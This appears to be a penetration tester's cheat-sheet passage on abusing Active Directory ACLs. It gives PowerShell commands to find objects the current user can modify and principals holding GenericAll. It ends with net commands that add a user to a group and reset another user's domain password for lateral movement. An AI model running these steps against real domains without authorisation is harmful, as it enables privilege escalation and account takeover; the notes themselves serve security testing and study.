An object in AD may have a set of permissions applied to it with multiple Access Control Entities. (ACE). These ACEs make up the the Access Control List (ACL). Each ACE defines whether access to the specific object is allowed or denied.

> Find ACLs we can modify:

```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

> View ACE's:

```
Get-ObjectAcl -Identity <username>
```

> Here it will output some information including SID's which we can convert to understand what it means:

```
Convert-SidToName <SID>
```

> The highest access permission we can have on an object is GenericAll. We can use the following command to display values that equal generic all and then show only the SID:

```
Get-ObjectAcl -Identity "<group_name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

> Now we can convert the SID's into names:

```
"<sid>","<sid>" | Convert-SidToName
```


> Depending on what permissions we have we could add our user to a group of our choosing:

```
net group "<group name>" <username> /add /domain
```

> We can also change a users password for easier lateral movement or if we are a Domain Admin:

```
net user <user> <new_password> /domain
```
